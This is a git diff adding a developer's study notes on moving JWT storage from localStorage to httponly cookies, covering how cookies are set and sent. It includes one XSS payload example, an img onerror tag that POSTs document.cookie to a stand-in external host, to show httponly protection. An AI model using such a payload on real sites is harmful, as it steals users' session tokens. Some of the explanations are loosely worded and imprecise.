@@ -757,8 +757,30 @@ function App() {
 
 ### Switching to Cookies 
 #### How Cookies Work 
-#### Add a Proxy to the API
-#### Set a Cookie on Login and Signup 
-#### Stop Storing JWT in local storage 
-#### VErify JWT from Cookie 
-#### Add a Cross-Site Request Forgery Token
+- we are currently storying JSON web tokens for our users in local storage 
+- using local storage does come with some security issues (i.e. XSS attack above took it out!)
+- one of the best places you can keep your JWT is in the browsers memory, the react state itself - as opposed to localstorage.
+  - however when you refresh the page, you won't get the persisted authentication state that mimmicks a 'session'
+- another way is to move the JWT out of localstorage, and put it in cookies instead. 
+
+COOKIES:
+- when you access a website (http://localhost:3000/dashboard), the server going to serve the page has the option of setting a cookie in the browser
+  - the request itself contains a response header (http://localhost:3000/dashboard) which contains a `Set-Cookie` header
+- after cookie is set in place, it will be sent back to the server it got the cookie from on any request that goes to it (the browser automatically includes that cookie in the request)
+  - i.e. it will only go back to the domain that it came from. if you got a cookie from localhost:3001, it will not send to localhost:3000. and this happens automatically by the browser.
+  - this would be on the request headers as `Cookie`
+- cookies are not accessible via javascript provided the proper secure attributes are set (set to httponly)
+- cookies have a limited storage capacity of 4kb 
+- OWASP recommends storing tokens using cookies
+- if we have our cookie attribute set to http only:
+````js
+<img src=?? onerror="fetch('https://dodgewebsite.com', {
+  { method: 'POST', body: document.cookie } 
+})" />
+// this doesn't give anything to the user, as its marked as httponly
+````
+- certain attacks like CSRF can get to httponly cookies and some XSS attacks, but it is safer in general
+
+- we have our API at localhost:3001 and our UI on localhost:3000, this is typical when setting up a SPA and then an API to back it
+- in prod if you're serving over different domains you won't be able to send your JSON web token in a cookie 
+- most apps these days use microservices, i.e. multiple services across multiple domains which doesn't work with cookies! 
